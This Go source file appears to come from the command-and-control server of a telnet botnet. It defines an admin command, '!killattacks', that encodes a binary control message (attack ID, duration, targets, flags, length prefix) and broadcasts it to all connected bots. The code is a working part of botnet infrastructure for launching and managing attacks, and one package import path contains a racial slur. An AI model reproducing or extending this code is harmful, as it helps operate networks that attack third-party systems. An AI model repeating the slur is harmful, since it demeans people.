package admin

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	slave_v2 "advanced-telnet-cnc/source/niggers/v2"
	"encoding/binary"
	"fmt"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"!killattacks", "!ka"},
		Description: "Stops all active attacks on all bots.",
		Admin:       true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			// Build payload
			// [ID (0xFF)] [Duration (0)] [NumTargets (0)] [NumFlags (0)]
			buf := make([]byte, 0)
			buf = append(buf, 0xFF) // ID for Kill Attacks

			tmp := make([]byte, 2)
			binary.BigEndian.PutUint16(tmp, 0) // Duration
			buf = append(buf, tmp...)

			buf = append(buf, 0) // NumTargets
			buf = append(buf, 0) // NumFlags

			// Final length prefix
			finalBuf := make([]byte, 2)
			binary.BigEndian.PutUint16(finalBuf, uint16(len(buf)))
			finalBuf = append(finalBuf, buf...)

			slave_v2.Slave.Broadcast(finalBuf, "", "", -1)

			session.Printf(fmt.Sprintf(config.Cyan, "Kill attacks command sent to all bots.\r\n"))
			return nil
		},
	})
}
